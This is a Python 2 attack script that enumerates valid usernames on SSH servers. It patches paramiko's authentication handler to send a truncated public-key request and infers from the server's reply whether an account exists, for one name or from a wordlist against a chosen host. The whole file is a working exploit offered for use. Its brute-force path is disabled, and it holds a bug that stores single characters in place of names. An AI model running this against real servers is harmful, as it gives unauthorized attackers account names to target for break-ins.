#!/usr/bin/env python2
import paramiko
import socket
import argparse
from sys import exit
import logging

# just to supress the logging errors
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())


def get_arguments():
    arg_parser = argparse.ArgumentParser()
    required = arg_parser.add_argument_group('required arguments')
    required.add_argument('-host', '--hostname',
                          type=str, help='The host you want to target.', required=True)
    arg_parser.add_argument('-p', '--port', type=int,
                            default=22, help='Target port. (Default 22)')
    arg_parser.add_argument('-user', '--username',
                            type=str, help='Check a single username.')
    arg_parser.add_argument('-w', '--wordlist', type=str,
                            help='Path to a usernames wordlist.')
    args = arg_parser.parse_args()
    # in case a user adds both username and wordlist flags, keep only the
    # wordlist
    if args.wordlist is not None and args.username is not None:
        args.username = None
    if args.wordlist is None and args.username is None:
        exit('Nothing to do!!')
    return args


class InvalidUsername(Exception):
    # create custom exception to be thrown instead of functions and return
    # signals
    pass


def service_accept(*args, **kwargs):
    # create modified version of the _parse_service_accept method in which we mess with the packet
    # https://github.com/paramiko/paramiko/blob/master/paramiko/auth_handler.py#L272
    # overwrite the add_boolean method with a function that does nothing
    paramiko.message.Message.add_boolean = lambda *args: None
    # this is done because the _parse_service_accept uses the add_boolean method to add a byte to the packet indicating the use of a password or a key
    # our packet has none thus its truncated!
    old_service_accept = paramiko.auth_handler.AuthHandler._parse_service_accept
    return old_service_accept(*args, **kwargs)


# create a new user auth failure handler that only raises an invalid user exception
# overwiting the method https://github.com/paramiko/paramiko/blob/master/paramiko/auth_handler.py#L626
# thats being used in _parse_service_accept after our truncated MSG_USERAUTH_REQUEST is sent.
# if the user does not exist the server will return an
# MSG_USERAUTH_FAILURE and we will just throw this exception.
def userauth_failure(*args, **kwargs):
    raise InvalidUsername()


# we need to update the handler table https://github.com/paramiko/paramiko/blob/master/paramiko/auth_handler.py#L708
# with our modified versions because thats being used in the run method of the transport
# here the handler table of the auth_handler is being used to handle all the messages that the server might sent
# https://github.com/paramiko/paramiko/blob/master/paramiko/transport.py#L2032
def update_handler_table():
    paramiko.auth_handler.AuthHandler._handler_table.update({
        paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
        paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
    })


def init_session(hostname, port):
    sock = socket.socket()
    try:
        sock.connect((hostname, port))
    except socket.error:
        exit('[-] Failed to connect to host')
    transport = paramiko.transport.Transport(sock)
    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        exit('[-] Failed to negotiate SSH transport')
    return transport


def is_valid_user(sess, username, key):
    try:
        # the auth public key will eventually come to use the modified method
        # that parses the service accept
        sess.auth_publickey(username, key)
    except InvalidUsername:
        return False
    except paramiko.ssh_exception.AuthenticationException:
        return True


def bruteforce_users(sess, users_wordlist):
    print '[+] Starting bruteforce..'
    dummy_key = paramiko.RSAKey.generate(2048)
    users_found = set()
    with open(users_wordlist) as f:
        for word in f:
            user = word.strip()
            if is_valid_user(sess, user, dummy_key):
                users_found.update(list(user))
                print '[+] Found user ', user
    return users_found


def check_single_user(sess, username):
    dummy_key = paramiko.RSAKey.generate(2048)
    if is_valid_user(sess, username, dummy_key):
        print '[+] User Exists!'
    else:
        print '[-] User does NOT exist!'


if __name__ == '__main__':
    # get cli arguments
    args = get_arguments()
    # start a ssh session to the server
    session = init_session(args.hostname, args.port)
    # inject our own functions to paramiko
    update_handler_table()
    # run check on either a username or a wordlist
    if args.username:
        check_single_user(session, args.username)
    else:
    	print 'Bruteforcing bugged out, fix soon..'
        # bruteforce_users(session, args.wordlist)
